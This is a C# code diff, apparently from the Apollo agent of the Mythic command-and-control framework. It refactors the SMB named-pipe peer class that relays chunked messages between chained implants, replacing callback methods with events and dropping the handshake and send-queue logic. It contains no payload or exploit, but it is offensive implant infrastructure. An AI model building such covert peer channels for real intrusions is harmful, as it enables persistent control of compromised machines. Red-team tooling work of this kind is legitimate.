@@ -17,22 +17,22 @@ using ApolloInterop.Enums.ApolloEnums;
 
 namespace Apollo.Peers.SMB
 {
-    public class SMBPeer : AI.Classes.Peer, INamedPipeCallback
+    public class SMBPeer : AI.Classes.P2P.Peer
     {
         private AsyncNamedPipeClient _pipeClient = null;
         private PipeStream _pipe = null;
-        private bool _expectEKE;
-        private ConcurrentDictionary<string, IPCMessageStore> _messageOrganizer = new ConcurrentDictionary<string, IPCMessageStore>();
-        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
-        private AutoResetEvent _senderEvent = new AutoResetEvent(false);
         private Action<object> _sendAction;
         private TTasks.Task _sendTask;
-        private MessageType _serverResponseType;
+
+        public event EventHandler ConnectionEstablished;
+        public event EventHandler Disconnect;
         public SMBPeer(IAgent agent, PeerInformation info) : base(agent, info)
         {
-            _pipeClient = new AsyncNamedPipeClient(info.Hostname, info.C2Profile.Parameters.PipeName, this);
-            _expectEKE = info.C2Profile.Parameters.EncryptedExchangeCheck == "T";
-
+            C2ProfileName = "smb";
+            _pipeClient = new AsyncNamedPipeClient(info.Hostname, info.C2Profile.Parameters.PipeName);
+            _pipeClient.ConnectionEstablished += OnConnect;
+            _pipeClient.MessageReceived += OnMessageReceived;
+            _pipeClient.Disconnect += OnDisconnect;
             _sendAction = (object p) =>
             {
                 while (((PipeStream)p).IsConnected)
@@ -45,6 +45,7 @@ namespace Apollo.Peers.SMB
                 }
             };
         }
+
 
         public void OnAsyncMessageSent(IAsyncResult result)
         {
@@ -67,26 +68,33 @@ namespace Apollo.Peers.SMB
             return _previouslyConnected && !_pipe.IsConnected;
         }
 
-        public void OnAsyncConnect(PipeStream pipe, out object state)
+        public void OnConnect(object sender, NamedPipeMessageArgs args)
         {
-            _pipe = pipe;
-            _sendTask = new TTasks.Task(_sendAction, pipe);
+            _pipe = args.Pipe;
+            if (ConnectionEstablished != null)
+            {
+                ConnectionEstablished(this, args);
+            }
+            _sendTask = new TTasks.Task(_sendAction, args.Pipe);
             _sendTask.Start();
             _previouslyConnected = true;
-            state = this;
         }
 
-        public void OnAsyncDisconnect(PipeStream pipe, object state)
+        public void OnDisconnect(object sender, NamedPipeMessageArgs args)
         {
-            pipe.Close();
+            args.Pipe.Close();
             _sendTask.Wait();
+            if (Disconnect != null)
+            {
+                Disconnect(this, args);
+            }
         }
 
-        public void OnAsyncMessageReceived(PipeStream pipe, AS.IPCData data, object state)
+        public void OnMessageReceived(object sender, NamedPipeMessageArgs args)
         {
             AS.IPCChunkedData chunkedData = _serializer.Deserialize<AS.IPCChunkedData>(
                 Encoding.UTF8.GetString(
-                    data.Data.Take(data.DataLength).ToArray()
+                    args.Data.Data.Take(args.Data.DataLength).ToArray()
                 )
             );
             lock(_messageOrganizer)
@@ -97,40 +105,6 @@ namespace Apollo.Peers.SMB
                 }
             }
             _messageOrganizer[chunkedData.ID].AddMessage(chunkedData);
-        }
-
-        public bool DeserializeToReceiver(byte[] data, MessageType mt)
-        {
-            // Probably where we do sorting based on EKE,
-            // checkin, and get_tasking
-            switch(mt)
-            {
-                // part of the checkin process, flag next message to be of EKE
-                case MessageType.EKEHandshakeMessage:
-                    _serverResponseType = MessageType.EKEHandshakeResponse;
-                    break;
-                default:
-                    _serverResponseType = MessageType.MessageResponse;
-                    break;
-            }
-            _agent.GetTaskManager().AddDelegateMessageToQueue(new DelegateMessage()
-            {
-                UUID = _uuid,
-                C2Profile = "smb",
-                Message = Encoding.UTF8.GetString(data)
-            });
-            return true;
-        }
-
-        public override void ProcessMessage(DelegateMessage message)
-        {
-            _mythicUUID = message.MythicUUID;
-            AS.IPCChunkedData[] chunks = _serializer.SerializeDelegateMessage(message.Message, _serverResponseType);
-            foreach(AS.IPCChunkedData chunk in chunks)
-            {
-                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
-            }
-            _senderEvent.Set();
         }
 
         public override bool Start()
